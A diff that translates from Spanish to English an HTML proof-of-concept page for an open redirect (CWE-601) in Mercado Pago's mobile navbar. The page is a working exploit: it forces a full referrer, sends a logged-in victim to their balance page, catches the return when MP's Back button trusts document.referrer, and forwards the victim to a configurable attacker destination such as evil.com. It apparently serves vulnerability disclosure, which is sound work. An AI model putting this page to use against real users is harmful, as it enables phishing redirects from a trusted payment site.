@@ -1,8 +1,8 @@
 <!doctype html>
-<html lang="es">
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<!-- envia el referrer COMPLETO cross-origin para que MP reciba esta URL -->
+<!-- sends the FULL referrer cross-origin so MP receives this URL -->
 <meta name="referrer" content="unsafe-url">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>PoC - Mercado Pago open redirect (CWE-601)</title>
@@ -18,7 +18,7 @@
 <div id="app"></div>
 <script>
 (function(){
-  // ==== CONFIG: destino final del atacante (cambiable). Tambien por URL: ...poc.html#evil=https://otro.com ====
+  // ==== CONFIG: attacker's final destination (editable). Also via URL: ...poc.html#evil=https://other.com ====
   var EVIL = "https://evil.com";
   var mHash = (location.hash.match(/evil=([^&]+)/)||[])[1];
   if (mHash) { try { EVIL = decodeURIComponent(mHash); } catch(e){} }
@@ -27,10 +27,10 @@
   var app = document.getElementById("app");
   function esc(s){return String(s).replace(/[&<>"']/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];});}
 
-  // Deteccion de retorno a prueba de balas: un query-param que viaja EN el referrer.
-  // Al tocar "go" ponemos ?frompoc=1 en NUESTRA url -> ese es el referrer que ve MP ->
-  // el boton Atras hace location.assign(referrer) -> volvemos a esta pagina CON ?frompoc=1.
-  // Respaldos: sessionStorage + document.referrer de MP. Se re-evalua en pageshow por si hay bfcache.
+  // Bulletproof return detection: a query-param that rides INSIDE the referrer.
+  // On "go" we put ?frompoc=1 in OUR url -> that is the referrer MP sees ->
+  // the "Back" button runs location.assign(referrer) -> we come back to this page WITH ?frompoc=1.
+  // Fallbacks: sessionStorage + MP's document.referrer. Re-evaluated on pageshow (bfcache).
   function render(){
     var ref = document.referrer || "";
     var returned = /[?&]frompoc=1/.test(location.search)
@@ -39,25 +39,25 @@
     if (returned) {
       sessionStorage.removeItem('poc_sent');
       app.innerHTML =
-        '<div class="ok"><h1>&#10003; Open redirect CONFIRMADO</h1>'+
-        '<p>Llegaste a este origen atacante desde una pagina legitima de Mercado Pago'+
-        (ref ? ':</p><code>'+esc(ref)+'</code>' : ' (boton Atras).</p>')+
-        '<p style="margin-top:12px">Reenviando a la landing del atacante &rarr; <code>'+esc(EVIL)+'</code> &hellip;</p></div>';
-      setTimeout(function(){ location.replace(EVIL); }, 1000);  // -> victima termina en evil.com
+        '<div class="ok"><h1>&#10003; Open redirect CONFIRMED</h1>'+
+        '<p>You landed on this attacker-controlled origin from a legitimate Mercado Pago page'+
+        (ref ? ':</p><code>'+esc(ref)+'</code>' : ' (the "Back" button).</p>')+
+        '<p style="margin-top:12px">Forwarding to the attacker landing &rarr; <code>'+esc(EVIL)+'</code> &hellip;</p></div>';
+      setTimeout(function(){ location.replace(EVIL); }, 1000);  // -> victim ends up on evil.com
     } else {
       app.innerHTML =
-        '<h1>PoC &mdash; Open redirect en Mercado Pago (CWE-601)</h1>'+
-        '<p>Abri esto en un navegador <b>mobile</b> (o con emulacion mobile en DevTools), '+
-        '<b>logueado en Mercado Pago</b>.</p>'+
+        '<h1>PoC &mdash; Open redirect in Mercado Pago (CWE-601)</h1>'+
+        '<p>Open this in a <b>mobile</b> browser (or with mobile emulation in DevTools), '+
+        '<b>logged in to Mercado Pago</b>.</p>'+
         '<ol>'+
-        '<li>Toca el boton azul de abajo.</li>'+
-        '<li>En la pagina de saldo de MP, toca <b>&#8592; Atras</b> (arriba a la izquierda del navbar).</li>'+
-        '<li>MP te devuelve a este origen y de aca saltas directo a <code>'+esc(EVIL)+'</code>.</li>'+
+        '<li>Tap the blue button below.</li>'+
+        '<li>On the MP balance page, tap <b>&#8592; Back</b> (top-left of the navbar).</li>'+
+        '<li>MP sends you back to this attacker origin, and from here you jump straight to <code>'+esc(EVIL)+'</code>.</li>'+
         '</ol>'+
-        '<a class="go" href="'+TARGET+'">&#9654; Ir a mi saldo de Mercado Pago</a>'+
-        '<p><small>El bug: el boton "Atras" del navbar mobile de MP hace '+
-        '<code>location.assign(document.referrer)</code> sin validar el host. '+
-        'Esta pagina controla el Referer, MP redirige aca, y de aca al destino del atacante.</small></p>';
+        '<a class="go" href="'+TARGET+'">&#9654; Go to my Mercado Pago balance</a>'+
+        '<p><small>The bug: the "Back" button of MP&#39;s mobile navbar runs '+
+        '<code>location.assign(document.referrer)</code> with no host validation. '+
+        'This page controls the Referer, MP redirects here, and from here to the attacker destination.</small></p>';
       var g = document.querySelector('a.go');
       if (g) g.addEventListener('click', function(){
         try { history.replaceState(null, '', location.pathname + '?frompoc=1'); } catch(e){}
@@ -66,8 +66,8 @@
     }
   }
   render();
-  // bfcache: al volver de MP, Chrome puede restaurar la pagina sin re-ejecutar el script;
-  // pageshow re-evalua el estado para disparar el redirect igual.
+  // bfcache: on return from MP, Chrome may restore the page without re-running the script;
+  // pageshow re-evaluates the state so the redirect still fires.
   window.addEventListener('pageshow', function(e){ if (e.persisted) render(); });
 })();
 </script>
